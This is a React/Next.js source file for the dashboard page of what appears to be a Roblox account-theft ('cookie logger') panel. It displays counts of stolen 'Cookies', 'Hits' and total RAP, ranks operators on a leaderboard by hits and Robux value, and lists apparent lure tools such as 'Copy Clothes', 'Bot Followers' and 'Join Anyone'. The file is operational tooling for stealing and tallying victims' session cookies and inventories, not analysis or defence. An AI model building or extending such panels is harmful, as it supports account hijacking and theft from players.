'use client'

import { useState, useEffect } from 'react'
import Link from 'next/link'

const TOOLS = [
  { name: 'Copy Clothes', icon: '👕', path: 'Copy-Clothes' },
  { name: 'Copy Games', icon: '🎮', path: 'Copy-Games' },
  { name: 'Bot Followers', icon: '👤', path: 'Bot-Followers' },
  { name: 'Group Botter', icon: '👥', path: 'Group-Botter' },
  { name: 'VC Enabler', icon: '🎤', path: 'Vc-Enabler' },
  { name: 'Join Anyone', icon: '🔓', path: 'Join-Anyone' },
  { name: 'Enable Shaders', icon: '✨', path: 'Enable-Shaders' },
  { name: 'Limited Checker', icon: '🔍', path: 'Limited-Checker' }
]

export default function DashboardPage() {
  const [stats, setStats] = useState(null)
  const [leaderboard, setLeaderboard] = useState([])
  const [leaderboardStats, setLeaderboardStats] = useState(null)
  const [directory, setDirectory] = useState('')

  useEffect(() => {
    fetch('/api/dashboard')
      .then(r => r.json())
      .then(d => {
        if (d.success) {
          setStats(d.stats)
        }
      })

    fetch('/api/dashboard?action=leaderboard')
      .then(r => r.json())
      .then(d => {
        if (d.success) {
          setLeaderboard(d.leaderboard)
          setLeaderboardStats(d.stats)
        }
      })

    const cookies = document.cookie.split(';')
    for (const c of cookies) {
      if (c.trim().startsWith('rc_session=')) {
        try {
          const val = decodeURIComponent(c.trim().split('=')[1])
          const parts = val.split(':')
          const decrypted = atob(parts[1] || '')
          const session = JSON.parse(decrypted)
          setDirectory(session.directory)
        } catch {}
      }
    }
  }, [])

  return (
    <div className="min-h-screen p-4 pb-24">
      <div className="max-w-2xl mx-auto">
        <div className="flex items-center justify-between mb-6">
          <h1 className="text-xl font-bold">Dashboard</h1>
          <span className="bg-green-500/20 text-green-400 text-xs px-2 py-1 rounded-full">Live</span>
        </div>

        {stats && (
          <div className="grid grid-cols-2 gap-3 mb-6">
            <div className="bg-card border border-border rounded-xl p-4">
              <p className="text-gray-400 text-xs mb-1">Total Hits</p>
              <p className="text-2xl font-bold">{stats.hits}</p>
            </div>
            <div className="bg-card border border-border rounded-xl p-4">
              <p className="text-gray-400 text-xs mb-1">Total RAP</p>
              <p className="text-2xl font-bold">{stats.rap.toLocaleString()}</p>
            </div>
            <div className="bg-card border border-border rounded-xl p-4">
              <p className="text-gray-400 text-xs mb-1">Cookies</p>
              <p className="text-2xl font-bold">{stats.cookies}</p>
            </div>
            <div className="bg-card border border-border rounded-xl p-4">
              <p className="text-gray-400 text-xs mb-1">Workspace</p>
              <p className="text-lg font-bold truncate">{directory || '...'}</p>
            </div>
          </div>
        )}

        {leaderboardStats && (
          <div className="bg-card border border-border rounded-xl p-4 mb-6">
            <h2 className="font-semibold mb-3">Leaderboard</h2>
            <div className="space-y-3">
              {leaderboard.slice(0, 10).map((user) => (
                <div key={user.directory} className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <span className="w-8 text-center font-bold">
                      {user.rank === 1 ? '👑' : user.rank === 2 ? '🥈' : user.rank === 3 ? '🥉' : `#${user.rank}`}
                    </span>
                    <div>
                      <p className="font-medium text-sm">{user.displayName}</p>
                      <p className="text-xs text-gray-400">{user.level} • {user.hits} hits</p>
                    </div>
                  </div>
                  <span className="text-sm text-green-400">{user.rap.toLocaleString()} R$</span>
                </div>
              ))}
            </div>
          </div>
        )}

        <div className="flex gap-2 overflow-x-auto pb-2 mb-4">
          <Link href="/links" className="bg-card border border-border rounded-lg px-4 py-2 text-sm whitespace-nowrap">🔗 Links</Link>
          <Link href="/storage" className="bg-card border border-border rounded-lg px-4 py-2 text-sm whitespace-nowrap">📦 Storage</Link>
          <Link href="/settings" className="bg-card border border-border rounded-lg px-4 py-2 text-sm whitespace-nowrap">⚙️ Settings</Link>
          <Link href="/custom-pages" className="bg-card border border-border rounded-lg px-4 py-2 text-sm whitespace-nowrap">🎨 Custom Pages</Link>
        </div>
      </div>
    </div>
  )
}
